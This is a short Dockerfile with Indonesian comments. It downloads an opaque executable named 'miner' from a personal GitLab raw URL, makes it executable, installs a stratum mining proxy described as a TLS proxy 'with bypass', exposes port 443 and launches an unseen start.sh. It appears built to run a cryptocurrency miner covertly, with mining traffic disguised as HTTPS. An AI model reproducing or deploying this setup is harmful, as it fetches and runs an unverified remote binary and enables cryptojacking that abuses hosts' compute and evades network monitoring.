FROM python:3.7-slim

WORKDIR /app

RUN apt-get update && apt-get install -y \
    curl wget git build-essential procps nodejs npm libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

# Binary Miner Custom Kamu
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Install TLS Proxy dengan bypass
RUN pip install --upgrade pip setuptools wheel && \
    pip install pyyaml==3.12 && \
    pip install aiostratum-proxy

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
